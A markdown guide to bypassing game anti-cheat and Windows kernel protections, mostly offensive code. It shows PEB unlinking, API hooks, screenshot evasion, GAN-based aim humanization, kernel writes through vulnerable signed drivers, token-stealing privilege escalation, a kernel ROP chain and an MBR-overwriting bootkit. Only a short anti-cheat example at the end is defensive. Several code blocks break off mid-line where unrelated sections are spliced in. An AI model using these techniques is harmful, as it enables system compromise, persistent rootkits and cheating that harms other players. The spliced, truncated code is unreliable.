## Anti-Cheat Bypass Techniques

Evade detection with these next-level bypasses.

### Core Techniques

- Hook `NtQuerySystemInformation`:
  ```cpp
  if (SystemInformationClass == SystemProcessInformation) {
      // Modify buffer to hide process
  }
  ```

- Patch `IsDebuggerPresent()`: Nullify checks with a byte edit.
- Disable ETW:
  ```asm
  mov rdx, [EtwpProviderTable]
  xor rdx, rdx
  ```

- Driver-Level Injection: Use signed exploit drivers (e.g., Capcom.sys).
- Unlink DLLs from PEB:
  ```cpp
  PLIST_ENTRY pList = (PLIST_ENTRY)pPeb->Ldr->InMemoryOrderModuleList.Flink;
  pList->Blink->Flink = pList->Flink;
  pList->Flink->Blink = pList->Blink;
  ```

- Obfuscate with VMProtect/Themida.
- Patch `rdtsc`:
  ```asm
  xor eax, eax
  ret
  ```

- Falsify telemetry, suspend AC threads, hijack overlays.

---

### Kernel Warfare

- Driver Signing Bypass: Exploit leaked certs (e.g., CVE-2023-36033).
- Hypervisor Detection Evasion: Patch CPUID VMX flags.
- Memory Cloaking: Modify CR3 to create ghost memory regions.
- DMA: Use PCILeech with FT601 FPGA for invisible RAM edits.
- Behavioral Spoofing: AI-generated mouse movement (GAN-based).

---

### Advanced Techniques

- Kernel Callbacks: Patch to avoid detection.
- Rootkits: Persistent cloaking and hiding memory pages.
- HWID Spoofing: Forged hardware identifiers to bypass bans.

---

## Anti-AntiCheat Signatures and Patches

This section provides a detailed framework for countering detection mechanisms employed by anti-cheat systems like Battleye, EasyAntiCheat (EAC), Vanguard, and others.

---

### Why This Matters

Anti-cheat systems don’t just detect cheat software; they identify cheating behavior and cheat footprints.

| Type       | Detection Method     | Examples                        |
|------------|----------------------|---------------------------------|
| Signature  | Static strings/hashes| `cheat.dll`, function stubs     |
| Behavioral | Timing, input        | Perfect recoil, pixel aim       |
| Memory     | Page access, patching| NOP’d cooldowns, IAT hooks      |
| Syscall    | API call graphs      | `NtReadVirtualMemory`           |
| Kernel     | SSDT, IRP, callbacks | Driver list, PsSet callbacks    |

---

### File Signature Detection (Static)

Anti-cheat scans memory for static patterns or hashes.

#### Common Flagged Strings

| Pattern               | Anti-Cheat    | Notes                        |
|-----------------------|---------------|------------------------------|
| "LoadLibraryA"        | All           | Classic DLL injection        |
| "GetAsyncKeyState"    | EAC, Vanguard | Keylogger, ESP detection     |
| "SetWindowsHookEx"    | Battleye, EAC | Global input hook            |
| "CheatEngine"         | All           | Memory/window title scan     |
| "NtOpenProcess"       | Vanguard      | Syscall flagging             |
| "CreateToolhelp32Snapshot" | Battleye | Process/thread enum          |

#### Mitigation Techniques

- **String Obfuscation**:
  ```cpp
  const char* LLA = "\x4C\x6F\x61\x64\x4C\x69\x62\x72\x61\x72\x79\x41";
  ```

- **Dynamic API Resolution**:
  ```cpp
  FARPROC GetAPIByHash(DWORD hash) { /* Export table walker */ }
  ```

- **Polymorphic Code**: Self-modifying shellcode.

---

### IAT and EAT Hook Detection

Anti-cheat systems inspect import/export tables.

#### Detection Example

```cpp
FARPROC* pIAT = (FARPROC*)(base + offset);
if ((uintptr_t)(*pIAT) != GetProcAddress(GetModuleHandle("user32.dll"), "MessageBoxA"))
    // Hooked!
```

#### Mitigation

- Rebuild IAT after injection.
- Inline hooks instead of IAT.
- Stealth trampolines:
  ```nasm
  original_code:
      mov r10, rcx
      mov eax, [syscall_id]
  stealth_gate:
      jmp qword [rel hidden_handler]
  hidden_handler:
      dq 0xDEADBEEFCAFEBABE
  ```

---

### Memory Signature Detection

Anti-cheat systems use AOB scanning for known patterns.

#### Example: ESP Hook
```cpp
// Original
call dword ptr [eax+0x70]
// Hooked
jmp myESPOverlay
```

#### Mitigation

- Trampoline hooks
- Encoded shellcode
- Cloaking memory:
  ```c
  void cloak_memory_region(void* addr, size_t size) {
      // Use shadow memory and hide with PTE changes
  }
  ```

---

### Process-Level Detection (PEB/Handles)

Anti-cheat may inspect:

- PEB module list
- `NtQuerySystemInformation`
- `NtQueryObject`
- `EnumWindows` for cheat UIs

#### Evasion Examples

- **Unlink from PEB**:
  ```cpp
  PLIST_ENTRY InMemoryOrder = &peb->Ldr->InMemoryOrderModuleList;
  InMemoryOrder->Flink->Blink = InMemoryOrder->Blink;
  InMemoryOrder->Blink->Flink = InMemoryOrder->Flink;
  ```

- **Hide Window**:
  ```cpp
  HWND hWnd = FindWindow(NULL, L"Cheat Engine 7.5");
  if (hWnd) ShowWindow(hWnd, SW_HIDE);
  ```

- **Block Handle Inspection**:
  ```cpp
  if (ObjectType == ObjectTypeInformation && IsOurHandle(handle)) {
      return STATUS_INVALID_HANDLE;
  }
  ```

---

### Kernel-Mode Detection (SSDT, IRP, Callbacks)

Detection points:

- IRP callbacks on \Device\KeyboardClass0
- SSDT hooks (e.g., `NtReadVirtualMemory`)
- Kernel object notify routines

#### Mitigation

- **Direct Syscalls**:
  ```cpp
  void* ZwReadVirtualMemory = get_syscall_address(0x3F);
  ```

- **Unregister Callbacks**:
  ```cpp
  ObUnRegisterCallbacks(MyHandle);
  ```

- **Hypervisor Execution**:
  ```cpp
  void execute_protected(void* code, size_t size) {
      enter_vmx_operation();
      load_encrypted_payload(code, size);
      set_vmcs_field(VMCS_GUEST_RIP, encrypted_entry);
      resume_guest();
  }
  ```

---

### Behavioral Detection Bypass

Flagged patterns:

| Behavior         | Reason             |
|------------------|--------------------|
| No recoil        | Inhuman precision  |
| 1ms reaction     | Scripted macros    |
| Perfect aim      | Triggerbots        |
| Static movement  | Bot detection      |

#### Mitigation Techniques

- Add jitter and randomized delay
- **GAN-generated Inputs**:
  ```python
  from gan_input import BehavioralGAN
  bot = BehavioralGAN(model="cs2_pro_player.gan")
  while gaming:
      real_input = capture_mouse_movement()
      stealth_input = bot.generate(real_input, variance=0.3)
      send_input(stealth_input)
  ```

---

### Anti-Screenshot and Video Detection

Anti-cheats may call `BitBlt`, `GetRenderTargetData`, or kernel video functions.

#### Bypass Examples

- **BitBlt Hook**:
  ```cpp
  BOOL BitBltHook(...) {
      if (IsBeingCaptured()) return FALSE;
      return OriginalBitBlt(...);
  }
  ```

- **Context-Aware Rendering**:
  ```cpp
  HRESULT __stdcall hkPresent(...) {
      if (is_capture_active()) {
          clean_render_target();
          auto hr = oPresent(...);
          restore_render_target();
          return hr;
      }
      render_esp();
      return oPresent(...);
  }
  ```

---

### Anti-AntiCheat Summary Table

| Layer      | Defense Mechanism        | Bypass Technique                  |
|------------|---------------------------|-----------------------------------|
| Usermode   | API hooks, title scans     | API hashing, string obfuscation   |
| Memory     | AOB, signature scans       | Encoded shellcode, trampolines    |
| Kernelmode | SSDT, IRP, callbacks       | Direct syscalls, VM hiding        |
| Behavioral | Input timing, aim paths    | Jitter, GAN emulation             |
| Forensics  | Screenshots, video frames  | Frame guards, present hooks       |


---
## Modern Anti-Cheat Deep Dives (2024-2026)

Advanced anti-cheats employ ring-0 drivers, ML behavioral detection, screenshot analysis, and virtualization-based security. This section covers bypass techniques for modern systems.

### Vanguard (Valorant / League of Legends)

Vanguard runs at ring-0 from boot, uses signed driver (vgk.sys), and performs continuous integrity checks.

#### Architecture

- **vgc.exe** (user-mode client) + **vgk.sys** (kernel driver)
- Loads at boot via ELAM (Early Launch Anti-Malware)
- TPM 2.0 integration for secure boot attestation
- TLS callbacks for pre-main initialization checks
- CPUID checks for hypervisor detection

#### Detection Vectors

```cpp
// Checks for test-signing mode
SYSTEM_CODEINTEGRITY_INFORMATION sci;
NtQuerySystemInformation(SystemCodeIntegrityInformation, &sci, sizeof(sci), NULL);
if (sci.CodeIntegrityOptions & CODEINTEGRITY_OPTION_TESTSIGN) {
    // Flag as vulnerable system
}

// Scans for vulnerable drivers (Capcom.sys, dbutil_2_3.sys, etc.)
HANDLE hDriver = CreateFileW(L"\\\\.\\Capcom", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (hDriver != INVALID_HANDLE_VALUE) {
    // Vulnerable driver detected - terminate game
}
```

#### Bypass Strategies

**1. Boot-Time Driver Signing Bypass**

```cpp
// Exploit HVCI weakness via custom signed driver
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    // Register driver unload
    DriverObject->DriverUnload = UnloadDriver;
    
    // Hook kernel functions before Vanguard loads
    PVOID pNtQuerySystemInformation = GetKernelProcAddress("NtQuerySystemInformation");
    HookKernelFunction(pNtQuerySystemInformation, Hook_NtQuerySystemInformation);
    
    return STATUS_SUCCESS;
}
```

**2. CPUID Hypervisor Masking**

```asm
; Patch CPUID check in VM to hide hypervisor bit
mov eax, 1
cpuid
and ecx, 0x7FFFFFFF  ; Clear bit 31 (hypervisor present)
```

**3. TLS Callback Patching**

```cpp
// Disable TLS callbacks before game launches
PIMAGE_TLS_DIRECTORY pTLS = GetTLSDirectory(hModule);
if (pTLS && pTLS->AddressOfCallBacks) {
    DWORD oldProtect;
    VirtualProtect((LPVOID)pTLS->AddressOfCallBacks, sizeof(DWORD_PTR), PAGE_READWRITE, &oldProtect);
    *(DWORD_PTR*)pTLS->AddressOfCallBacks = 0;  // Nullify callbacks
    VirtualProtect((LPVOID)pTLS->AddressOfCallBacks, sizeof(DWORD_PTR), oldProtect, &oldProtect);
}
```

**4. Memory Integrity Bypass**

```python
import pymem

pm = pymem.Pymem("VALORANT-Win64-Shipping.exe")

## Windows Security Features Bypass (2024-2026)

Modern Windows implements hardware-enforced security features that complicate kernel-mode exploits.

### HVCI (Hypervisor-Protected Code Integrity)

HVCI uses VT-x to enforce code integrity from a hypervisor layer, preventing unsigned kernel code execution.

#### How HVCI Works

```
Hypervisor (VTL 1 - Secure Kernel)
    ↓ Validates
Kernel Mode (VTL 0 - Normal Kernel)
    ↓ Executes
User Mode Applications
```

#### Detection

```cpp
SYSTEM_CODEINTEGRITY_INFORMATION sci = {0};
sci.Length = sizeof(sci);
NtQuerySystemInformation(SystemCodeIntegrityInformation, &sci, sizeof(sci), NULL);

if (sci.CodeIntegrityOptions & CODEINTEGRITY_OPTION_HVCI_KMCI_ENABLED) {
    printf("HVCI is enabled\n");
}
```

#### Bypass Strategies

**1. Exploitable Signed Driver**

```cpp
// Use known vulnerable driver to execute arbitrary kernel code
HANDLE hDevice = CreateFileW(L"\\\\.\\DBUtil_2_3", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

typedef struct _RTCORE64_WRITE {
    DWORD64 Address;
    DWORD64 Value;
} RTCORE64_WRITE;

RTCORE64_WRITE write_cmd;
write_cmd.Address = target_kernel_address;
write_cmd.Value = hook_function_address;

DWORD bytesReturned;
DeviceIoControl(hDevice, 0x80002040, &write_cmd, sizeof(write_cmd), NULL, 0, &bytesReturned, NULL);
```

**2. Data-Only Attack (DOP)**

```cpp
// Modify kernel data structures without executing unsigned code
void ModifyKernelData() {
    // Locate EPROCESS structure
    PVOID pEPROCESS = GetCurrentEPROCESS();
    
    // Modify Token pointer to elevate privileges (data-only)
    PVOID systemToken = GetSystemToken();
    *(PVOID*)((ULONG64)pEPROCESS + TOKEN_OFFSET) = systemToken;
}
```

**3. Return-Oriented Programming (ROP) in Kernel**

```cpp
// Chain existing signed code gadgets
ULONG64 rop_chain[] = {
    0xfffff8000dead000,  // pop rcx; ret
    target_cr4_value,
    0xfffff8000beef000,  // mov cr4, rcx; ret
    0xfffff8000cafe000,  // jmp [desired_function]
};

// Execute ROP chain via stack pivot
ExecuteRopChain(rop_chain, sizeof(rop_chain));
```

---

### VBS (Virtualization-Based Security)

VBS isolates critical security functions in a secure enclave (VSM - Virtual Secure Mode).

#### Components

- **Secure Kernel** (runs in VTL 1)
- **Credential Guard** (protects LSASS credentials)
- **Device Guard** (code integrity)

#### Bypass Techniques

**1. Pre-VBS Boot Persistence**

```cpp
// Install bootkit before VBS initialization
NTSTATUS InstallBootkit() {
    // Modify boot loader before secure boot
    HANDLE hBootLoader = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    
    // Read MBR/GPT
    BYTE bootSector[512];
    DWORD bytesRead;
    ReadFile(hBootLoader, bootSector, 512, &bytesRead, NULL);
    
    // Inject hook into boot chain
    memcpy(bootSector + 0x1BE, shellcode, sizeof(shellcode));
    
    SetFilePointer(hBootLoader, 0, NULL, FILE_BEGIN);
    WriteFile(hBootLoader, bootSector, 512, &bytesRead, NULL);
    
    CloseHandle(hBootLoader);
    return STATUS_SUCCESS;
}
```

**2. DMA Attack**

```python
## Behavioral ML Detection Evasion

### Input Humanization with GANs

```python
import torch
import torch.nn as nn

class InputHumanizer(nn.Module):
    def __init__(self):
        super().__init__()
        
        # Generator network
        self.generator = nn.Sequential(
            nn.Linear(100, 256),
            nn.LeakyReLU(0.2),
            nn.Linear(256, 512),
            nn.LeakyReLU(0.2),
            nn.Linear(512, 2)  # Output: (mouse_x, mouse_y) delta
        )
        
    def forward(self, z):
        return self.generator(z)
    
    def generate_human_input(self, target_delta):
        # Add noise to make input look human
        z = torch.randn(1, 100)
        
        # Generate realistic input path
        generated = self.forward(z)
        
        # Scale to target
        scaled = generated * torch.tensor(target_delta)
        
        return scaled.detach().numpy()[0]

class MouseHumanizer:
    def __init__(self):
        self.model = InputHumanizer()
        self.load_pretrained_model()
        
    def humanize_mouse_movement(self, current_pos, target_pos):
        delta = (target_pos[0] - current_pos[0], target_pos[1] - current_pos[1])
        distance = np.sqrt(delta[0]**2 + delta[1]**2)
        
        # Generate path with human-like characteristics
        num_steps = max(5, int(distance / 10))
        path = []
        
        for i in range(num_steps):
            t = i / num_steps
            
            # Bezier curve with noise
            noise = self.model.generate_human_input([10, 10])
            
            point = (
                current_pos[0] + delta[0] * t + noise[0],
                current_pos[1] + delta[1] * t + noise[1]
            )
            
            path.append(point)
            
            # Add reaction time variation
            time.sleep(0.001 + random.gauss(0.003, 0.001))
        
        return path
```

### Timing Attack Evasion

```cpp
class TimingEvasion {
private:
    std::mt19937 rng;
    std::normal_distribution<double> reaction_time;
    std::normal_distribution<double> action_interval;
    
public:
    TimingEvasion() {
        rng.seed(std::random_device{}());
        
        // Human reaction time: 200-350ms (mean 250ms, stddev 40ms)
        reaction_time = std::normal_distribution<double>(250, 40);
        
        // Action intervals: 100-500ms
        action_interval = std::normal_distribution<double>(200, 80);
    }
    
    void HumanizedAction(std::function<void()> action) {
        // Add reaction delay
        double delay_ms = std::max(150.0, reaction_time(rng));
        std::this_thread::sleep_for(std::chrono::milliseconds((int)delay_ms));
        
        // Execute action
        action();
        
        // Add post-action delay
        double interval_ms = std::max(80.0, action_interval(rng));
        std::this_thread::sleep_for(std::chrono::milliseconds((int)interval_ms));
    }
    
    void SimulateThinkTime() {
        // Humans pause to think/assess
        // 5% chance of longer pause
        if ((rng() % 100) < 5) {
            int think_ms = 500 + (rng() % 1500);
            std::this_thread::sleep_for(std::chrono::milliseconds(think_ms));
        }
    }
    
    void AddMicroCorrections(float& mouse_x, float& mouse_y) {
        // Humans make tiny corrections
        std::normal_distribution<float> micro(0.0f, 0.5f);
        
        mouse_x += micro(rng);
        mouse_y += micro(rng);
    }
};
```

---

## Anti-Cheat Development Perspective

### Building Simple Anti-Cheat System

```cpp
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>
#include <string>

class AntiCheatSystem {
private:
    DWORD game_pid;
    std::vector<DWORD> suspicious_processes;
    
public:
    AntiCheatSystem(DWORD pid) : game_pid(pid) {}
    
    // 1. Detect known cheat tools
    bool DetectCheatTools() {
        const wchar_t* cheat_tools[] = {
            L"cheatengine-x86_64.exe",
            L"x64dbg.exe",
            L"ollydbg.exe",
            L"ida.exe",
            L"ida64.exe"
        };
        
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return false;
        
        PROCESSENTRY32W pe32;
        pe32.dwSize = sizeof(pe32);
        
        if (Process32FirstW(hSnapshot, &pe32)) {
            do {
                for (const auto& tool : cheat_tools) {
                    if (_wcsicmp(pe32.szExeFile, tool) == 0) {
                        CloseHandle(hSnapshot);
                        return true;
                    }
                }
            } while (Process32NextW(hSnapshot, &pe32));
        }
        
        CloseHandle(hSnapshot);
        return false;
    }
    
    // 2. Detect debuggers
    bool DetectDebugger() {
        // IsDebuggerPresent
        if (IsDebuggerPresent()) {
            return true;
        }
        
        // CheckRemoteDebuggerPresent
        BOOL debuggerPresent = FALSE;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerPresent);
        if (debuggerPresent) {
            return true;
        }
        
        // NtQueryInformationProcess
        typedef NTSTATUS (WINAPI* NtQueryInformationProcess_t)(HANDLE, DWORD, PVOID, ULONG, PULONG);
        NtQueryInformationProcess_t NtQueryInformationProcess = 
            (NtQueryInformationProcess_t)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess");
        
        if (NtQueryInformationProcess) {
            DWORD debugPort = 0;
            NtQueryInformationProcess(GetCurrentProcess(), 7, &debugPort, sizeof(debugPort), NULL);
            if (debugPort != 0) {
                return true;
            }
        }
        
        return false;
    }
    
    // 3. Integrity checks
    bool VerifyCodeIntegrity() {
        HMODULE hModule = GetModuleHandle(NULL);
        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
        PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
        
        // Calculate hash of .text section
        PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNTHeaders);
        for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) {
            if (strcmp((char*)pSection->Name, ".text") == 0) {
                BYTE* code = (BYTE*)hModule + pSection->VirtualAddress;
                DWORD size = pSection->Misc.VirtualSize;
                
                DWORD hash = CalculateCRC32(code, size);
                
                // Compare with known good hash
                if (hash != 0x12345678) {  // Replace with actual hash
                    return false;
                }
            }
            pSection++;
        }
        
        return true;
    }
    
    // 4. Memory protection scan
    bool ScanMemoryProtections() {
        MEMORY_BASIC_INFORMATION mbi;
        PBYTE address = NULL;
        
        while (VirtualQuery(address, &mbi, sizeof(mbi))) {
            // Detect suspicious RWX pages
            if (mbi.Protect == PAGE_EXECUTE_READWRITE && mbi.Type == MEM_PRIVATE) {
                // Potential code injection
                return false;
            }
            
            address += mbi.RegionSize;
        }
        
        return true;
    }
    
    // 5. Detect external processes reading memory
    bool DetectMemoryReaders() {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return false;
        
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(pe32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (pe32.th32ProcessID == game_pid) continue;
                
                // Try to open game process with PROCESS_VM_READ
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    // Check if this process has handle to our process
                    if (HasHandleToProcess(hProcess, game_pid)) {
                        CloseHandle(hProcess);
                        CloseHandle(hSnapshot);
                        return true;
                    }
                    CloseHandle(hProcess);
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        
        CloseHandle(hSnapshot);
        return false;
    }
    
    // Main scan routine
    void RunScan() {
        while (true) {
            if (DetectCheatTools()) {
                printf("[!] Cheat tool detected\n");
                TriggerBan();
            }
            
            if (DetectDebugger()) {
                printf("[!] Debugger detected\n");
                TriggerBan();
            }
            
            if (!VerifyCodeIntegrity()) {
                printf("[!] Code integrity check failed\n");
                TriggerBan();
            }
            
            if (!ScanMemoryProtections()) {
                printf("[!] Suspicious memory protections\n");
                TriggerBan();
            }
            
            if (DetectMemoryReaders()) {
                printf("[!] External memory reader detected\n");
                TriggerBan();
            }
            
            Sleep(5000);  // Scan every 5 seconds
        }
    }
    
private:
    DWORD CalculateCRC32(BYTE* data, DWORD size) {
        DWORD crc = 0xFFFFFFFF;
        for (DWORD i = 0; i < size; i++) {
            crc ^= data[i];
            for (int j = 0; j < 8; j++) {
                crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
            }
        }
        return ~crc;
    }
    
    bool HasHandleToProcess(HANDLE hProcess, DWORD target_pid) {
        // Implementation would enumerate handles
        return false;
    }
    
    void TriggerBan() {
        // Send ban request to server
        ExitProcess(0);
    }
};
```

---

